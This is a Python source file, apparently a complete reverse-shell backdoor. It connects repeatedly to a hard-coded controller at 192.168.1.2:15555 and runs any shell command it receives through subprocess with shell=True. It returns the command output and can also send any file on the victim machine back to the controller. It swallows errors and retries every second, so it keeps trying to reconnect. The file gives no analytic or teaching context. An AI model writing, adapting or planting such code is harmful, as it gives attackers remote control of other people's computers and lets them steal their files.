import socket
import os
import subprocess
import time

host = '192.168.1.2'
port = 15555

while True:

    try:

        s = socket.socket()

        s.connect((host, port))

        while True:

            data = s.recv(1024)

            if data.decode('utf-8') == 'cmd':

                while True:

                    data = s.recv(1024)

                    if data[:2].decode('utf-8') == 'cd':

                        try:
                            
                            os.chdir(data[3:].decode('utf-8'))
                            s.send(os.getcwd().encode('utf-8'))

                        except FileNotFoundError:
                            s.send('file not found'.encode('utf-8'))

                    elif data.decode('utf-8') == 'quit':
                        break

                    else:

                        if len(data) > 0:

                            cmd = subprocess.Popen(data.decode('utf-8'), shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)

                            output = cmd.stdout.read() + cmd.stderr.read()

                            output_str = str(output, encoding = 'cp857')

                            location = os.getcwd()

                            s.send(str.encode(output_str + '\n' + location, encoding='utf-8'))

                        else:

                            s.send(b' ')

            
            elif data.decode('utf-8') == 'file':

                location = s.recv(1024).decode('utf-8')

                size = str(os.path.getsize(location))

                s.send(size.encode('utf-8'))

                s.recv(1024)

                with open(location, mode='rb') as file:
                    
                    data = file.read(1024)

                    while data:

                        s.send(data)

                        data = file.read(1024)


            else:
                s.send(b' ')


    except:
        time.sleep(1)
